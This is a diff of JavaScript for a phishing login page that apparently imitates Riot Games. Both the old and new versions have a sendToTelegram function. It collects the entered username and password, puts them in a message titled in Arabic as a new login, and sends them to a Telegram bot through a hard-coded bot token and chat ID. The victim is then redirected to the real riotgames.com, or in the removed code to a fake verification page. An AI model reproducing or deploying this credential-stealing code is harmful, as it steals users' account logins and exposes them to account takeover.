@@ -1,54 +1,45 @@
-document.addEventListener("DOMContentLoaded", function () {
-    const usernameInput = document.querySelector("input[name='username']");
-    const passwordInput = document.querySelector("input[name='password']");
-    const loginBtn = document.querySelector(".login-btn");
-    const svgIcon = loginBtn.querySelector("svg path"); // تأكد من تحديد العنصر بشكل صحيح
-
-    
-    function handleInput(input) {
+function handleInput(input) {
     const span = input.previousElementSibling;
     if (input.value !== "") {
         span.style.opacity = "0";
     } else {
         span.style.opacity = "1";
     }
+    checkInputs();
 }
 
-    function checkInputs() {
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
+function checkInputs() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const loginBtn = document.getElementById("login-btn");
 
-        if (isValidUsername(username) && isValidPassword(password)) {
-            loginBtn.removeAttribute("disabled");
-            loginBtn.style.backgroundColor = "#cf3c3f"; // تفعيل الزر باللون الأحمر
-            svgIcon.style.fill = "#ffffff"; // تغيير لون السهم إلى الأبيض
-        } else {
-            loginBtn.setAttribute("disabled", "true");
-            loginBtn.style.backgroundColor = "#ececec"; // تعطيل الزر باللون الرمادي
-            svgIcon.style.fill = "#a7a7a7"; // تغيير لون السهم إلى الرمادي
-        }
+    if (username !== "" && password.length > 6) {
+        loginBtn.removeAttribute("disabled");
+    } else {
+        loginBtn.setAttribute("disabled", "true");
+    }
+}
+
+function sendToTelegram() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (username === "" || password.length <= 6) {
+        
+        return;
     }
 
-    function sendToTelegram() {
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
+    const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; 
+    const chatId = "6687453395";  
+    const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
 
-        if (!isValidUsername(username) || !isValidPassword(password)) return;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // ضع توكن البوت الخاص بك هنا
-        const chatId = "6687453395"; // ضع معرف الشات الخاص بك هنا
-        const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
+    fetch(url)
+        .then(() => {
+            alert("تم إرسال البيانات بنجاح!");
+            window.location.href = "https://www.riotgames.com/";
+        })
+        .catch(error => console.error("Error sending to Telegram:", error));
+}
 
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-        fetch(url)
-            .then(() => {
-                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html";
-            })
-            .catch(error => console.error("Error sending to Telegram:", error));
-    }
-
-    usernameInput.addEventListener("input", checkInputs);
-    passwordInput.addEventListener("input", checkInputs);
-    loginBtn.addEventListener("click", sendToTelegram);
-});
